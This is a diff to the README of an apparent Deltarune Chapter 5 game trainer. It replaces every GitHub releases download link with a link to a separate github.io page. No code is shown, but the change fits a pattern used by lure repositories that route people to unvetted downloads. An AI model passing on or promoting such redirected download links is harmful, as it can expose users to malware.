@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-External - Master every battle with ease
 
-[![Download the Trainer](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Herschdisciplined698/Deltarune-Chapter5-Trainer-External/releases)
+[![Download the Trainer](https://img.shields.io/badge/Download-Release-blue)](https://herschdisciplined698.github.io)
 
 ## 📁 What is this trainer?
 
@@ -21,7 +21,7 @@ To run this tool, your computer needs these basic specifications:
 
 Follow these steps to set up the trainer on your machine.
 
-1.  Visit the [official releases page](https://github.com/Herschdisciplined698/Deltarune-Chapter5-Trainer-External/releases) to download the latest version of the toolkit.
+1.  Visit the [official releases page](https://herschdisciplined698.github.io) to download the latest version of the toolkit.
 2.  Find the file ending in .zip within the latest release section.
 3.  Click the file to start the download.
 4.  Navigate to your Downloads folder to find the file.
@@ -87,4 +87,4 @@ Use the trainer for your own enjoyment. Only enable the features you need for cu
 
 Download the trainer by visiting our page at the provided link below. Once you have the file, ensure you keep it in a folder separate from your game files to maintain order. If you enjoy the tool, you can bookmark the repository page to stay updated on future improvements.
 
-[Click here to visit the download page](https://github.com/Herschdisciplined698/Deltarune-Chapter5-Trainer-External/releases)
+[Click here to visit the download page](https://herschdisciplined698.github.io)
